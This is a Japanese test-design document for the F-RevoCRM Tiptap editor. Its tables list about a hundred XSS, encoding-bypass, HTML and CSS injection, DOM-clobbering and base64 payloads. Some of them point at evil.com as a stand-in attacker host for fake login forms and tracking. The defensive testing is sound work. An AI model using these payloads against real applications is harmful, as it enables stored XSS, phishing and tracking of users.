# Tiptapリッチテキストエディタ 脆弱性テスト仕様設計書

## 1. 概要

### 1.1 目的
F-RevoCRM 8.0.0のTiptapリッチテキストエディタに対して、多層防御（フロントエンド: Tiptapスキーマベース検証+値正規化、バックエンド: HTMLPurifier+イベント属性除去）が正しく機能しているかを検証する脆弱性テストの仕様。

### 1.2 スコープ
- **エンドツーエンド**: フロントエンド入力 → POST送信 → バックエンド浄化 → DB保存 → 再表示の全フロー
- **単体テスト中心 + 結合テスト少数**: 各レイヤーの単体テストで網羅性を確保し、レイヤー間の隙間を結合テストで補完
- **XSS重点**: XSS関連を厚く、他カテゴリはクリティカル項目を重点的に検証

### 1.3 テスト対象フィールド（全7フィールド）

| フィールド名 | モジュール | 保存経路 | 備考 |
|---|---|---|---|
| `notecontent` | Documents | Save.php | ドキュメント本文 |
| `description` | 複数モジュール共通 | Save.php | 説明欄 |
| `commentcontent` | ModComments | SaveAjax.php | Ajax保存 |
| `solution` | HelpDesk | Save.php | チケット解決策 |
| `question` | Faq | Save.php | FAQ質問 |
| `faq_answer` | Faq | Save.php | FAQ回答 |
| `signature` | Users（設定） | SaveAjax.php | メール署名 |

---

## 2. 防御レイヤー定義

### 2.1 レイヤー構成

| レイヤー | 実装箇所 | 役割 |
|---|---|---|
| L1: Tiptapスキーマ | parseHTML/renderHTML | 登録外要素の破棄、値の正規化 |
| L2: HTMLPurifier | vtlib_purify() | ホワイトリスト方式のHTML浄化 |
| L3: イベント属性除去 | purifyHtmlEventAttributes() | 67個以上のイベントハンドラ除去 |
| L4: 統合（ソースモード経由） | L1をバイパスしてL2+L3で防御 | 多層防御の最終防衛線 |

### 2.2 正確な浄化パイプラインフロー

```
入力
  ↓
decode_html（1回目）
  ↓
HTMLPurifier実行
  ↓
purifyHtmlEventAttributes（1回目 — vtlib_purify内部）
  ↓
[vtlib_purify戻り値]
  ↓
decode_html（2回目）
  ↓
purifyHtmlEventAttributes（2回目 — Save.php側）
  ↓
DB保存
```

**重要**: `purifyHtmlEventAttributes`は合計2回実行される。1回目はHTMLPurifier直後（vtlib_purify内部）、2回目はdecode_html後（Save.php側）。この二重実行の間にdecode_htmlが挟まる構造がエンコーディングバイパスの核心的な攻撃面。

### 2.3 purifyHtmlEventAttributes内部処理

1. `strip_base64_data`でbase64データを`__VTIGERB64STRIPMARK_`プレフィックスのマーカーに置換
2. 正規表現でイベント属性を除去
3. `restore`でマーカーをbase64データに復元

---

## 3. テストスイート構成

### 3.1 全体構成

| # | スイート | 重点度 | テスト方式 | ケース数 |
|---|---|---|---|---|
| 1 | XSS（Stored XSS） | **最重点** | 単体 + 結合 | 40件 |
| 2 | エンコーディングバイパス | **重点** | 単体 + 結合 | 17件 |
| 3 | レイヤー間の隙間 | **重点** | 結合 | 18件 |
| 4 | HTMLインジェクション | 標準 | 単体 | 10件 |
| 5 | CSSインジェクション | 標準 | 単体 | 10件 |
| 6 | DOMクロバリング | 標準 | 単体 | 5件 |
| 7 | base64画像悪用 | 標準 | 単体 | 7件 |
| | **合計** | | | **107件** |

### 3.2 判定基準

| 判定 | 基準 |
|---|---|
| **PASS** | 期待する防御レイヤーで除去・無害化されている |
| **PASS（別レイヤー）** | 除去されているが、期待と異なるレイヤーで防御（要調査フラグ付与） |
| **FAIL** | 危険な要素/属性が残存し、XSSまたはインジェクションが成立する |

### 3.3 クリティカル要検証項目

| # | 項目 | リスク |
|---|---|---|
| 1 | 3-10: 二重エンコードで浄化回避 | decode_htmlが浄化前後で2回呼ばれる設計上、2段階デコードでscriptタグが復活する可能性 |
| 2 | 5-05: CSS.AllowTricky=trueによるUI詐欺 | display:none/opacity:0でコンテンツ隠蔽が可能になる可能性 |
| 3 | 6-02: Attr.EnableID=trueによるDOMクロバリング | 任意のid属性がHTMLPurifierを通過し、既存JSと衝突する可能性 |
| 4 | 7-02/7-05: base64画像サイズ無制限 | 巨大base64によるDoS（ブラウザ・サーバー双方） |
| 5 | CSS.Proprietary=trueによるIE固有CSS | expression()等がバイパス可能な可能性 |

---

## 4. Suite 1: XSS（Stored XSS）【最重点】

### 4.1 scriptタグ系

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-01 | 基本scriptタグ | `<script>alert(1)</script>` | L1破棄, L2除去 | scriptタグ完全除去 |
| 1-02 | 大文字混在 | `<ScRiPt>alert(1)</sCrIpT>` | L1破棄, L2除去 | 同上 |
| 1-03 | null文字挿入 | `<scr\x00ipt>alert(1)</script>` | L2除去 | 同上 |
| 1-04 | 改行挿入 | `<scr\nipt>alert(1)</script>` | L2除去 | 同上 |
| 1-05 | タブ挿入 | `<scr\tipt>alert(1)</script>` | L2除去 | 同上 |
| 1-06 | 閉じタグなし | `<script>alert(1)` | L2除去 | 同上 |
| 1-07 | 二重scriptタグ | `<script><script>alert(1)</script></script>` | L2除去 | 同上 |

### 4.2 イベント属性系

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-08 | onerror | `<img src=x onerror="alert(1)">` | L1破棄, L3除去 | onerror属性除去 |
| 1-09 | onload | `<body onload="alert(1)">` | L1破棄, L3除去 | onload属性除去 |
| 1-10 | onmouseover | `<div onmouseover="alert(1)">test</div>` | L3除去 | onmouseover属性除去 |
| 1-11 | onfocus+autofocus | `<input onfocus="alert(1)" autofocus>` | L1破棄, L3除去 | onfocus属性除去 |
| 1-12 | onanimationend | `<div onanimationend="alert(1)">` | L3除去 | 属性除去 |
| 1-13 | 大文字イベント | `<img src=x ONERROR="alert(1)">` | L3除去 | 大文字小文字不問で除去 |
| 1-14 | スペース挿入 | `<img src=x on error="alert(1)">` | L3除去 | 属性除去 |
| 1-15 | タブ区切り | `<img src=x\tonerror="alert(1)">` | L3除去 | 属性除去 |

### 4.3 javascript: URI系

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-16 | 基本javascript: | `<a href="javascript:alert(1)">click</a>` | L2除去 | href属性除去またはリンク除去 |
| 1-17 | 大文字混在 | `<a href="JaVaScRiPt:alert(1)">` | L2除去 | 同上 |
| 1-18 | タブ挿入 | `<a href="java\tscript:alert(1)">` | L2除去 | 同上 |
| 1-19 | 改行挿入 | `<a href="java\nscript:alert(1)">` | L2除去 | 同上 |
| 1-20 | エンティティ混在 | `<a href="&#106;avascript:alert(1)">` | L2除去 | 同上 |
| 1-21 | vbscript | `<a href="vbscript:MsgBox(1)">` | L2除去 | 同上 |
| 1-22 | data:URI+script | `<a href="data:text/html,<script>alert(1)</script>">` | L2除去 | 同上 |

### 4.4 SVG/MathML系

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-23 | SVG onload | `<svg onload="alert(1)">` | L1破棄, L2+L3除去 | svgタグまたはonload除去 |
| 1-24 | SVG script | `<svg><script>alert(1)</script></svg>` | L2除去 | script除去 |
| 1-25 | SVG animate | `<svg><animate onbegin="alert(1)">` | L3除去 | onbegin除去 |
| 1-26 | MathML | `<math><maction actiontype="statusline">XSS</maction></math>` | L1破棄, L2除去 | タグ除去 |
| 1-27 | SVG foreignObject | `<svg><foreignObject><body onload="alert(1)">` | L2+L3除去 | 危険要素除去 |

### 4.5 img/iframe/object系

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-28 | iframe | `<iframe src="javascript:alert(1)">` | L1破棄, L2除去 | iframeタグ除去 |
| 1-29 | iframe srcdoc | `<iframe srcdoc="<script>alert(1)</script>">` | L1破棄, L2除去 | 同上 |
| 1-30 | object data | `<object data="javascript:alert(1)">` | L1破棄, L2除去 | objectタグ除去 |
| 1-31 | embed src | `<embed src="javascript:alert(1)">` | L1破棄, L2除去 | embedタグ除去 |
| 1-32 | img longdesc | `<img src=x longdesc="javascript:alert(1)">` | L2除去 | longdesc除去 |
| 1-33 | video onerror | `<video><source onerror="alert(1)">` | L1破棄, L3除去 | onerror除去 |

### 4.6 style属性によるXSS

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-34 | expression() | `<div style="width:expression(alert(1))">` | L2除去 | expression()除去 |
| 1-35 | -moz-binding | `<div style="-moz-binding:url(evil)">` | L2除去 | 除去 |
| 1-36 | behavior | `<div style="behavior:url(evil.htc)">` | L2除去 | 除去 |
| 1-37 | background+javascript | `<div style="background:url(javascript:alert(1))">` | L2除去 | 除去 |

### 4.7 テンプレートインジェクション

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 1-38 | templateタグ | `<template><script>alert(1)</script></template>` | L1破棄, L2除去 | template/script除去 |
| 1-39 | noscript | `<noscript><img src=x onerror="alert(1)"></noscript>` | L2除去 | noscript除去 |
| 1-40 | meta refresh | `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">` | L1破棄, L2除去 | metaタグ除去 |

---

## 5. Suite 2: エンコーディングバイパス【重点】

### 5.1 HTMLエンティティバイパス

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 2-01 | 10進数参照 | `&#60;script&#62;alert(1)&#60;/script&#62;` | L2除去 | デコード後にscript除去 |
| 2-02 | 16進数参照 | `&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;` | L2除去 | 同上 |
| 2-03 | セミコロン省略 | `&#60script&#62alert(1)&#60/script&#62` | L2除去 | 同上 |
| 2-04 | ゼロパディング | `&#0000060;script&#0000062;` | L2除去 | 同上 |
| 2-05 | 名前付きエンティティ+数値混在 | `&lt;script&gt;alert(&#49;)&lt;/script&gt;` | L2除去 | デコード後にscript除去 |

### 5.2 二重デコード

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 2-06 | 二重HTMLエンコード | `&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;` | L2+decode_html | 1回デコード後もタグにならない、または除去 |
| 2-07 | URLエンコード+HTML | `%3Cscript%3Ealert(1)%3C/script%3E` | L2除去 | script除去 |
| 2-08 | 二重URLエンコード | `%253Cscript%253Ealert(1)%253C/script%253E` | L2除去 | デコード後にscript除去 |
| 2-09 | decode_html順序問題 | `&lt;img src=x onerror=&quot;alert(1)&quot;&gt;` | L2+L3 | デコード→浄化の順序でイベント属性除去 |

### 5.3 UTF-8バイパス

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 2-10 | オーバーロングUTF-8 | `<` を `0xC0 0xBC` で表現 | L2除去 | 不正バイト列を拒否またはデコード後に除去 |
| 2-11 | UTF-8 BOM挿入 | `\xEF\xBB\xBF<script>alert(1)</script>` | L2除去 | BOM無視後にscript除去 |
| 2-12 | UTF-7エンコード | `+ADw-script+AD4-alert(1)+ADw-/script+AD4-` | L2除去 | UTF-7として解釈されない |

### 5.4 null/制御文字バイパス

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 2-13 | null文字タグ分断 | `<scri\x00pt>alert(1)</script>` | L2除去 | null除去後にscript除去 |
| 2-14 | null文字属性分断 | `<img src=x on\x00error="alert(1)">` | L3除去 | null除去後にonerror除去 |
| 2-15 | バックスペース挿入 | `<img src=x o\x08nerror="alert(1)">` | L3除去 | 制御文字除去後にonerror除去 |
| 2-16 | ZWS（ゼロ幅スペース）挿入 | `<scr\u200Bipt>alert(1)</script>` | L1(ZWS除去), L2除去 | ZWS除去後にscript除去 |
| 2-17 | ZWSP+イベント属性 | `<img src=x on\u200Berror="alert(1)">` | L3除去 | ZWS除去後にonerror除去 |

---

## 6. Suite 3: レイヤー間の隙間【重点・結合テスト】

### 6.1 ソースモード経由（L1バイパス）

| # | テストケース | 操作手順 | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 3-01 | ソースモードでscript注入 | ソースモード切替→`<script>alert(1)</script>`入力→保存 | L2除去 | 保存後にscriptタグなし |
| 3-02 | ソースモードでイベント属性注入 | ソースモード切替→`<img src=x onerror="alert(1)">`入力→保存 | L2+L3除去 | 保存後にonerrorなし |
| 3-03 | ソースモードでjavascript:URI | ソースモード切替→`<a href="javascript:alert(1)">link</a>`入力→保存 | L2除去 | 保存後にhref除去またはリンク除去 |
| 3-04 | ソースモードでiframe注入 | ソースモード切替→`<iframe src="https://evil.com">`入力→保存 | L2除去 | 保存後にiframeなし |

### 6.2 保存→再表示の変換差異

| # | テストケース | 操作手順 | 検証ポイント | 期待結果 |
|---|---|---|---|---|
| 3-05 | 正規化→浄化→再パースの一貫性 | Tiptapで色付きテキスト入力→保存→再編集画面で確認 | HTMLPurifierが正規化済みHTMLを変更しないか | 色・スタイルが保持される |
| 3-06 | HTMLPurifier変換後の再パース | ソースモードで`<div style="background-color:#ff0000">`→保存→再編集 | HTMLPurifierが属性形式を変換した場合にTiptapが正しくパースするか | スタイル保持 |
| 3-07 | 二重浄化の安全性 | 同じレコードを2回保存 | 浄化の二重適用でHTMLが壊れないか | 内容が変化しない |

### 6.3 decode_html処理順序

| # | テストケース | 入力ペイロード | 検証ポイント | 期待結果 |
|---|---|---|---|---|
| 3-08 | エンティティで偽装したscript | `&lt;script&gt;alert(1)&lt;/script&gt;` | 1回目decode_htmlでタグ化→vtlib_purifyで除去される | scriptタグなし |
| 3-09 | エンティティで偽装したイベント属性 | `&lt;img src=x onerror=&quot;alert(1)&quot;&gt;` | decode_html→vtlib_purify→decode_html→event除去の全段階で防御 | onerrorなし |
| 3-10 | **二重エンコードで浄化回避試行** | `&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;` | 1回目decode_htmlで`&lt;`になり、vtlib_purifyを通過、2回目decode_htmlでタグ化する可能性 | **要検証**: scriptタグが残らないこと |
| 3-11 | 三重エンコード | `&amp;amp;lt;script&amp;amp;gt;alert(1)` | decode_htmlが何段階デコードするか | scriptタグが残らないこと |

### 6.4 フィールド別保存経路差異

代表的なXSSペイロード `<img src=x onerror="alert(1)">` を全フィールドで実行。

| # | テストケース | フィールド | 保存経路 | 期待結果 |
|---|---|---|---|---|
| 3-12 | notecontent | Documents | Save.php | onerrorなし |
| 3-13 | description | Leads等 | Save.php | onerrorなし |
| 3-14 | commentcontent | ModComments | SaveAjax.php | onerrorなし |
| 3-15 | solution | HelpDesk | Save.php | onerrorなし |
| 3-16 | question | Faq | Save.php | onerrorなし |
| 3-17 | faq_answer | Faq | Save.php | onerrorなし |
| 3-18 | signature | Users設定 | SaveAjax.php | onerrorなし |

---

## 7. Suite 4: HTMLインジェクション【標準】

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 4-01 | formタグ注入 | `<form action="https://evil.com"><input type="submit" value="ログイン">` | L1破棄, L2除去 | formタグ除去 |
| 4-02 | baseタグ注入 | `<base href="https://evil.com/">` | L1破棄, L2除去 | baseタグ除去 |
| 4-03 | linkタグ注入 | `<link rel="stylesheet" href="https://evil.com/evil.css">` | L1破棄, L2除去 | linkタグ除去 |
| 4-04 | 閉じタグ不整合 | `<b><i>text</b></i>` | L1+L2 | タグ構造が正しく修復される |
| 4-05 | 属性値引用符なし | `<img src=x onerror=alert(1)>` | L1破棄, L3除去 | onerror除去 |
| 4-06 | バッククォート属性値 | `` <img src=`x` onerror=`alert(1)`> `` | L3除去 | onerror除去 |
| 4-07 | 不正なネスト | `<table><tr><td><table><form><td><input>` | L2修復 | 構造修復、form除去 |
| 4-08 | コメントによるタグ隠蔽 | `<!--<script>-->alert(1)<!--</script>-->` | L2除去 | コメント内外ともscript除去 |
| 4-09 | CDATA注入 | `<![CDATA[<script>alert(1)</script>]]>` | L2除去 | CDATA+script除去 |
| 4-10 | 未知のカスタム要素 | `<custom-element onload="alert(1)">test</custom-element>` | L1破棄, L2除去 | カスタム要素除去 |

---

## 8. Suite 5: CSSインジェクション【標準・一部クリティカル】

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 | クリティカル |
|---|---|---|---|---|---|
| 5-01 | styleタグ注入 | `<style>body{display:none}</style>` | L1破棄, L2除去 | styleタグ除去 | |
| 5-02 | @import | `<div style="@import url('https://evil.com/evil.css')">` | L2除去 | @import除去 | |
| 5-03 | background-image URL | `<div style="background-image:url('https://evil.com/track.gif')">` | L2除去 | 外部URL除去 | |
| 5-04 | **UI詐欺: 全画面オーバーレイ** | `<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#fff;z-index:9999">偽ログイン画面</div>` | L1(position破棄), L2除去 | position/z-index除去 | **クリティカル** |
| 5-05 | **UI詐欺: 要素隠蔽** | `<div style="display:none">hidden</div><div style="opacity:0">invisible</div>` | L2(CSS.AllowTricky=true) | **要検証**: display:none/opacity:0が許可される可能性 | **クリティカル** |
| 5-06 | **外部リソース読み込み** | `<div style="list-style-image:url('https://evil.com/track.gif')">` | L2除去 | 外部URL除去 | **クリティカル** |
| 5-07 | var()によるCSS変数 | `<div style="color:var(--evil-color)">text</div>` | L2除去 | var()除去 | |
| 5-08 | calc()の濫用 | `<div style="width:calc(100vw - 1px)">text</div>` | L1正規化, L2 | vw単位が除去される | |
| 5-09 | font-family注入 | `<span style="font-family:';}</style><script>alert(1)</script>">` | L1(制御文字拒否) | font-family拒否 | |
| 5-10 | unicode-range外部プローブ | `<style>@font-face{font-family:x;src:url(https://evil.com/f);unicode-range:U+0041}</style>` | L2除去 | styleタグ除去 | |

---

## 9. Suite 6: DOMクロバリング【標準】

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 |
|---|---|---|---|---|
| 6-01 | form名衝突 | `<form id="getElementById">` | L1破棄, L2除去 | form除去 |
| 6-02 | **id属性でJS変数上書き** | `<div id="__proto__">test</div>` | L2(Attr.EnableID=true) | **要検証**: id属性が保持される可能性 |
| 6-03 | name属性でdocumentプロパティ上書き | `<img name="cookie" src=x>` | L1破棄, L2 | name属性除去 |
| 6-04 | anchor id衝突 | `<a data-anchor="existingElementId">` | L1(anchor.ts) | data-anchorとして出力、id/nameにならない |
| 6-05 | **複数要素でNodeList生成** | `<a id="x"></a><a id="x"></a>` | L2 | **要検証**: 同一id重複時の動作 |

---

## 10. Suite 7: base64画像悪用【標準・一部クリティカル】

| # | テストケース | 入力ペイロード | 期待防御レイヤー | 期待結果 | クリティカル |
|---|---|---|---|---|---|
| 7-01 | 正常なbase64画像 | `<img src="data:image/png;base64,iVBOR...">` | L1許可, L2許可 | 正常表示 | |
| 7-02 | **巨大base64（DoS）** | `<img src="data:image/png;base64,AAAA...(10MB)">` | L1許可? | **要検証**: サイズ制限の有無 | **クリティカル** |
| 7-03 | 不正MIME型 | `<img src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">` | L2除去 | text/html拒否 |
| 7-04 | base64内にscript | `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIj4=">` | L2除去 | SVG+onload拒否 |
| 7-05 | **複数巨大画像** | `<img src="data:image/png;base64,...(5MB)"><img src="data:image/png;base64,...(5MB)">` | L1? | **要検証**: 累計サイズ制限 | **クリティカル** |
| 7-06 | **マーカー文字列偽装** | `<img src="__VTIGERB64STRIPMARK_0" onerror="alert(1)">` | L3除去 | マーカー偽装でonerrorが残らないこと | |
| 7-07 | **マーカー+base64混在** | `<img src="data:image/png;base64,ABC" onerror="__VTIGERB64STRIPMARK_1">` | L3除去 | リストア処理でイベント属性が復活しないこと | |

---

## 11. テスト実装方針

### 11.1 テストファイル配置

| テスト種別 | 配置先 |
|---|---|
| Jest（フロントエンド正規化） | `assets/react-web-components/src/components/ui/tiptap/__tests__/security/` |
| PHPUnit（バックエンド浄化） | `test/unit/tiptap-security/backend/` |
| Playwright（結合テスト） | `test/unit/tiptap-security/integration/` |

### 11.2 単体テストの実装方針

**Jest（フロントエンド）**
- normalize.ts の各正規化関数（normalizeColor, normalizeLength, normalizeFontFamily等）に対してペイロードを直接投入
- parseHTML/renderHTMLのラウンドトリップ検証

**PHPUnit（バックエンド）**
- vtlib_purify() に対してペイロードを直接投入し、出力HTMLを検証
- purifyHtmlEventAttributes() に対してペイロードを直接投入し、出力HTMLを検証
- 浄化パイプライン全体（decode_html→vtlib_purify→decode_html→purifyHtmlEventAttributes）をシミュレートするテスト

### 11.3 結合テストの実装方針

**Playwright**
- ログイン→対象モジュール画面→Tiptapエディタでペイロード入力→保存→再表示→HTML検証
- ソースモード経由のテストケースはソースモード切替操作を含む
- 各フィールドの保存経路差異を検証するため、モジュール別にテストを実行

### 11.4 スモークテスト用サブセット

CI統合用に、最もクリティカルなケースをサブセットとして定義する。

| # | ケース | 理由 |
|---|---|---|
| 1-01 | 基本scriptタグ | XSSの最基本ケース |
| 1-08 | onerror | イベント属性XSSの代表 |
| 1-16 | javascript:URI | URIスキームXSSの代表 |
| 2-06 | 二重HTMLエンコード | エンコーディングバイパスの代表 |
| 3-01 | ソースモードでscript注入 | L1バイパスの代表 |
| 3-10 | 二重エンコードで浄化回避 | 最クリティカルケース |
| 5-04 | UI詐欺: 全画面オーバーレイ | CSSインジェクションの代表 |
| 7-06 | マーカー文字列偽装 | マーカー処理バイパスの代表 |

---

## 12. 関連ファイル

| 項目 | ファイルパス |
|---|---|
| Tiptapメインコンポーネント | `assets/react-web-components/src/components/ui/tiptap/tiptap.tsx` |
| 正規化ユーティリティ | `assets/react-web-components/src/components/ui/tiptap/extensions/utils/normalize.ts` |
| HTMLサニタイズ | `include/utils/VtlibUtils.php` (662-825行) |
| Save処理 | `modules/Vtiger/actions/Save.php` (165-186行) |
| SaveAjax処理 | `modules/Vtiger/actions/SaveAjax.php` (77-163行) |
| 拡張インデックス | `assets/react-web-components/src/components/ui/tiptap/extensions/index.ts` |
| HTMLプリザーベーション仕様 | `docs/superpowers/specs/2026-04-02-tiptap-html-preservation-design.md` |
